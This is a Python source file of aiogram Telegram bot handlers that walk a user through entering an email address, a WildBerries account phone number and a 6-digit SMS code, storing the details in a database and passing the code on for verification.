import re

from aiogram import F, types
from aiogram.filters import StateFilter
from aiogram.types import FSInputFile
from aiogram.fsm.context import FSMContext

from states.authorization_states import StateEmail, StatePhone, StateApprove
from keyboards.InlineMarkup.default_commands import cancel
from utils.database.get_async_session_db import get_db_connection
from handlers.routes import router
from configuration_bot.settings import config
from tasks.check_sms_code import write_sms_code, get_next_code_iteration
from configuration_bot.settings import get_logger

logger = get_logger()


@router.message(F.text, StateFilter(StateEmail.email_state))
async def email_text(msd: types.Message, state: FSMContext):
    email = msd.text.strip()
    user_id = str(msd.from_user.id)

    # Проверка формата email
    if not re.match(r"^[^@]+@[^@]+\.[^@]+$", email):
        await msd.answer(
            text=('☹️Почтовый адрес введен некорректно\n\n'
                  '<b>Введите почту:</b>\n<b>Пример:</b> pepa@example.ru'),
            parse_mode="HTML"
        )
        return

    try:
        async with get_db_connection() as conn:
            # Проверяем — есть ли уже такой chat_id в таблице
            existing_user = await conn.fetchrow(
                "SELECT wp_email, is_verified FROM auth_user WHERE chat_id = $1", user_id
            )

            if existing_user:
                is_verified = existing_user["is_verified"]
                if is_verified:
                    await msd.answer(
                        text="Вы уже авторизованы.",
                        parse_mode="HTML"
                    )
                    await state.clear()
                    return

                # Обновляем email
                await conn.execute(
                    "UPDATE auth_user SET wp_email = $1 WHERE chat_id = $2",
                    email, user_id
                )
            else:
                # Вставляем новую запись
                await conn.execute(
                    "INSERT INTO auth_user (wp_email, chat_id) VALUES ($1, $2)",
                    email, user_id
                )

    except Exception as e:
        logger.error(f"[DB ERROR] {e}")
        await msd.answer("⚠️ Ошибка базы данных. Попробуйте позже.")
        return

    await msd.answer(
        text="<b>📞 Введите номер телефона от аккаунта WildBerries \n\n"
             "Пример для России:\n"
             "+79995553322</b>",
        parse_mode="HTML"
    )

    await state.update_data(email=email)
    await state.set_state(StatePhone.phone_state)


@router.message(F.text, StateFilter(StatePhone.phone_state))
async def phone_text(msd: types.Message, state: FSMContext,):
    phone = msd.text.strip()

    if phone.startswith('+375') and len(phone) == 13:
        pass
    elif not phone.startswith('+7') or len(phone) != 12:
        await msd.answer(
            text=('☹️Номер телефона введен некорректно\n\n'
                  '<b>Введите номер телефона:</b>\n'
                  '<b>Пример для России:</b> +79995553322\n'),
            parse_mode="HTML"
        )
        return

    await state.update_data(phone=phone)
    data = await state.get_data()
    await state.set_state(StateApprove.approve)
    logger.info("Нахожусь в состоянии подтверждения данных")

    # await msd.answer(
    #     text=('<b>⁉️📋 Проверьте пожалуйста Ваши данные:\n\n</b>'
    #           f'<b>Номер телефона: \n{phone}</b>\n\n'
    #           f'<b>Адресс почты: \n{data.get("email")}</b>'),
    #     reply_markup=cancel(),
    #     parse_mode="HTML"
    # )
    photo = FSInputFile(path=config.DATA_APPROVE)

    await msd.answer_photo(
        photo=photo,
        caption=(f'<b>⁉️📋 Проверьте пожалуйста Ваши данные:</b>\n\n'
                 f'<b>Номер телефона:</b> {phone}\n\n'
                 f'<b>Адресс почты:</b> {data.get("email")}'),
        parse_mode="HTML",
        reply_markup=cancel()
    )


@router.message(F.text)
async def get_captcha(msd: types.Message):
    chat_id = msd.from_user.id
    code = msd.text.strip()

    if not code.isdigit() or len(code) != 6:
        return await msd.answer(
            "<b>☝️КОД ВВЕДЕН НЕ КОРРЕКТНО</b>☝️\n"
            "Код должен состоять из 6 цифр\n\n"
            "😌<b>Введите код повторно</b>😌",
            parse_mode="HTML"
        )

    async with get_db_connection() as conn:
        row = await conn.fetchrow("SELECT auth_state FROM auth_user WHERE chat_id = $1", str(chat_id))

        if not row or row["auth_state"] != "waiting_sms_code":
            # Пользователь не должен вводить код сейчас — игнорируем
            return

        try:
            code_iteration = await get_next_code_iteration(chat_id)
            await write_sms_code(
                chat_id=chat_id,
                sms_code=code,
                code_iteration=code_iteration
            )

            await conn.execute(
                "UPDATE auth_user SET auth_state = NULL WHERE chat_id = $1",
                str(chat_id)
            )

            await msd.answer(
                text="<b>Код получен, ожидайте идет проверка...⌛️</b>",
                parse_mode="HTML"
            )

        except Exception as e:
            logger.error(f"[Ошибка при обработке кода]: {e}")

            # сбросим состояние даже при ошибке, чтобы не застряло
            await conn.execute(
                "UPDATE auth_user SET auth_state = NULL WHERE chat_id = $1",
                str(chat_id)
            )
            await msd.answer(
                text="⚠️ Произошла ошибка при обработке кода. Попробуйте снова.",
                parse_mode="HTML"
            )
